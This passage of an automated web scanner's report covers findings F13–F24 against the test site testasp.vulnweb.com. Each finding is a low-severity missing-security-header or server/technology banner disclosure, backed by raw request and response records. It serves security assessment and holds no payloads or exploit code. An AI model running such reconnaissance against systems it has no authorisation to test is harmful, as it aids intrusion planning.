  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum search</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [31 more lines, 3846 chars total]
  elapsed_ms: 356.4
  --- RAW REQUEST req-55443d46 (exactly as issued by the engine) ---
  GET /Search.asp?tfSearch=1&tfSearch=
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 500
  headers:
    cache-control: private
    content-length: 1208
    content-type: text/html
    date: Sat, 03 Oct 2026 01:19:43 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">\x0d
    <html xmlns="http://www.w3.org/1999/xhtml">\x0d
    <head>\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>\x0d
    <title>500 - Internal server error.</title>\x0d
    <style type="text/css">\x0d
    <!--\x0d
    body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\x0d
    fieldset{padding:0 15px 10px 15px;} \x0d
    h1{font-size:2.4em;margin:0;color:#FFF;}\x0d
    h2{font-size:1.7em;margin:0;color:#CC0000;} \x0d
    h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \x0d
    ... [17 more lines, 1294 chars total]
  elapsed_ms: 363.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Search.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASP F13] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Login.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-2aacffaa (exactly as issued by the engine) ---
  GET /Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3214
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:42 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum login</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [42 more lines, 3375 chars total]
  elapsed_ms: 344.8
  --- RAW REQUEST req-29af1125 (exactly as issued by the engine) ---
  POST /Login.asp?RetURL=%2FDefault.asp%3F
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=&tfUPass=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3198
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:43 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum login</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [42 more lines, 3359 chars total]
  elapsed_ms: 331.3
  --- RAW REQUEST req-0dada91e (exactly as issued by the engine) ---
  POST /Login.asp
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=&tfUPass=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3127
    content-type: text/html
    date: Sat, 03 Oct 2026 01:20:07 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum login</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [42 more lines, 3288 chars total]
  elapsed_ms: 325.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Login.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASP F14] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Register.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-cdd2a366 (exactly as issued by the engine) ---
  GET /Register.asp?RetURL=%2Fshowforum.asp%3Fid%3D0
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3631
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:04 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum register</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [49 more lines, 3813 chars total]
  elapsed_ms: 356.6
  --- RAW REQUEST req-76decf28 (exactly as issued by the engine) ---
  POST /Register.asp?RetURL=%2FDefault.asp%3F
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=&tfRName=&tfEmail=&tfUPass=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3546
    content-type: text/html
    date: Sat, 03 Oct 2026 01:17:50 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum register</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [49 more lines, 3728 chars total]
  elapsed_ms: 366.0
  --- RAW REQUEST req-24853284 (exactly as issued by the engine) ---
  POST /Register.asp
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=&tfRName=&tfEmail=&tfUPass=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3545
    content-type: text/html
    date: Sat, 03 Oct 2026 01:21:05 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum register</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [49 more lines, 3727 chars total]
  elapsed_ms: 318.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Register.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASP F15] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/showforum.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-a5cb5e92 (exactly as issued by the engine) ---
  GET /showforum.asp?id=2
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 2933
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:22 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum Miscellaneous</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [38 more lines, 3082 chars total]
  elapsed_ms: 364.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/showforum.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASP F16] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/showthread.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-e14f5608 (exactly as issued by the engine) ---
  GET /showthread.asp?id=3
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 4181
    content-type: text/html
    date: Sat, 03 Oct 2026 01:19:35 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum\x0d
    aaa\x0d
    </title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    ... [60 more lines, 4213 chars total]
  elapsed_ms: 352.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/showthread.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASP F17] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-d42908cd (exactly as issued by the engine) ---
  GET 
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3538
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:20 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum forums</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [33 more lines, 3672 chars total]
  elapsed_ms: 338.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F18] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-d42908cd (exactly as issued by the engine) ---
  GET 
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3538
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:20 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum forums</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [33 more lines, 3672 chars total]
  elapsed_ms: 338.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F19] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/styles.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-eb3974b8 (exactly as issued by the engine) ---
  GET /styles.css
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    accept-ranges: bytes
    content-length: 3390
    content-type: text/css
    date: Sat, 03 Oct 2026 01:15:21 GMT
    etag: "cea5331f85c1c81:0"
    last-modified: Thu, 29 May 2008 12:11:27 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    body {\x0d
    	font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;\x0d
    	font-size: 12px;\x0d
    	margin: 0;\x0d
    }\x0d
    \x0d
    td {\x0d
    	font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;\x0d
    	font-size: 12px;\x0d
    }\x0d
    \x0d
    th {\x0d
    ... [177 more lines, 3956 chars total]
  elapsed_ms: 359.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/styles.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F20] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/styles.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-eb3974b8 (exactly as issued by the engine) ---
  GET /styles.css
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    accept-ranges: bytes
    content-length: 3390
    content-type: text/css
    date: Sat, 03 Oct 2026 01:15:21 GMT
    etag: "cea5331f85c1c81:0"
    last-modified: Thu, 29 May 2008 12:11:27 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    body {\x0d
    	font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;\x0d
    	font-size: 12px;\x0d
    	margin: 0;\x0d
    }\x0d
    \x0d
    td {\x0d
    	font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;\x0d
    	font-size: 12px;\x0d
    }\x0d
    \x0d
    th {\x0d
    ... [177 more lines, 3956 chars total]
  elapsed_ms: 359.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/styles.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F21] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Templatize.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-47d077ba (exactly as issued by the engine) ---
  GET /Templatize.asp?item=html%2Fabout.html
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 4598
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:21 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>Untitled Document</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [49 more lines, 4180 chars total]
  elapsed_ms: 349.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Templatize.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F22] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Templatize.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-47d077ba (exactly as issued by the engine) ---
  GET /Templatize.asp?item=html%2Fabout.html
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 4598
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:21 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>Untitled Document</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [49 more lines, 4180 chars total]
  elapsed_ms: 349.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Templatize.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F23] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Default.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-92a1d0ed (exactly as issued by the engine) ---
  GET /Default.asp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3538
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:40 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum forums</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [33 more lines, 3672 chars total]
  elapsed_ms: 351.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Default.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F24] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Default.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
